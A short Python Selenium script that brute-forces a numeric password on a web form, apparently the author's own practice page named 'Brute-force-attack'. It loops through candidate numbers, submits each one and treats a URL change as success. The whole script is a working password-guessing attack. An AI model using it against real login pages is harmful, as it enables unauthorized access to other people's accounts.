import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Setup WebDriver
chrome_driver_path = r"C:/Users/volta/OneDrive/Documents/Programmes/Brute-force-attack/chromedriver-win64/chromedriver.exe"
options = webdriver.ChromeOptions()
options.add_experimental_option("detach", False)  # Ensure browser closes properly
driver = webdriver.Chrome(options=options)

url = "https://nxthxn-dev.github.io/Brute-force-attack/index.html"
driver.get(url)

start_range = 123449
end_range = 130000
original_url = driver.current_url  # Store the initial URL

for password in range(start_range, end_range):
    try:
        # Wait for input field and button
        input_field = WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.ID, "password"))
        )
        submit_button = WebDriverWait(driver, 5).until(
            EC.element_to_be_clickable((By.TAG_NAME, "button"))
        )

        # Enter password
        input_field.clear()
        input_field.send_keys(str(password))
        submit_button.click()

        time.sleep(1)  # Wait for page update

        # Check if URL has changed
        if driver.current_url != original_url:
            print(f"[✔] Password found: {password}")
            break  # Stop loop once correct password is found

    except Exception:
        print(f"[X] Tried {password}, incorrect.")  # Removed the ❌ emoji causing the Unicode error
        continue  # Continue loop if password is wrong

time.sleep(2)  # Allow brief pause before quitting
driver.quit()  # Close browser after finding correct password
